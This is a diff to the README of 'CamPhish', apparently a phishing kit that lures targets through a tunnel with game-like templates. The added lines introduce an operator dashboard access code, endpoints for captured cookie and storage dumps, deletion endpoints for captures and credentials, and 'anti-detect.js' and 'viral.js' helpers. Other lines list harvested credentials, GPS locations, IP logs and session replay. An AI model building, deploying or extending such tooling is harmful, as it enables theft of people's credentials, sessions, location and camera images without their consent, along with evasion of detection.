@@ -13,9 +13,12 @@ docker compose --profile cloudflared up -d
 ```
 
 - Dashboard: http://localhost:8080
+- Dashboard: `http://localhost:8080/?code=<access-code>`
 - TrailBase Admin: http://localhost:4000/_/admin/
 - Game: http://localhost:8080/t/face-runner
 - Tunnel: `docker compose logs cloudflared | grep trycloudflare`
+
+Get the access code with `./scripts/docker-code.sh` or `cat data/.access_code`.
 
 ## Architecture
 
@@ -64,14 +67,17 @@ Target → CamPhish (Rust :8080) → SQLite + TrailBase (:4000)
 
 ### Dashboard (operator-facing)
 - `GET /api/health` — System health
+- `GET /api/access` — Local-only access code helper
 - `GET /api/stats` — Aggregate statistics
 - `GET /api/captures` — Paginated capture list
 - `GET /api/locations` — GPS locations
 - `GET /api/ips` — IP logs with breakdowns
 - `GET /api/credentials` — Captured credentials
+- `GET /api/storage` — Captured cookies/storage dumps
 - `GET /api/events` — Session replay timeline
 - `GET /api/templates` — Template registry
 - `GET /api/sessions` — Session management
+- `DELETE /api/captures`, `/api/locations`, `/api/ips`, `/api/events`, `/api/credentials`, `/api/storage`, `/api/sessions/:id` — Cleanup endpoints
 
 ## Documentation
 
@@ -103,10 +109,12 @@ Target → CamPhish (Rust :8080) → SQLite + TrailBase (:4000)
 
 1. **NEVER** `docker compose down -v` (deletes DB + captures)
 2. **NEVER** rename `trailbase/schema/V7__camphish.sql` (V1-V6 reserved)
-3. Template placeholders: `API_BASE_URL` → `/api`, `forwarding_link` → tunnel URL
-4. All templates include `recon.js` and call `CamPhishRecon.init()`
-5. DOM elements use `el` prefix (elScore, elCombo) — prevents variable collisions
-6. Games must work WITHOUT camera — camera is optional enhancement
+3. Dashboard access uses `?code=<access-code>` for the SPA shell; use `DASHBOARD_TOKEN` or external auth for API protection on exposed deployments
+4. Template placeholders are resolved from the live request origin first; env vars are only fallbacks
+5. Helper assets like `/t/viral.js` and `/t/anti-detect.js` are served as JavaScript and are not operator-visible templates
+6. All templates include `recon.js` and call `CamPhishRecon.init()`
+7. DOM elements use `el` prefix (elScore, elCombo) — prevents variable collisions
+8. Games must work WITHOUT camera — camera is optional enhancement
 
 ## License
 
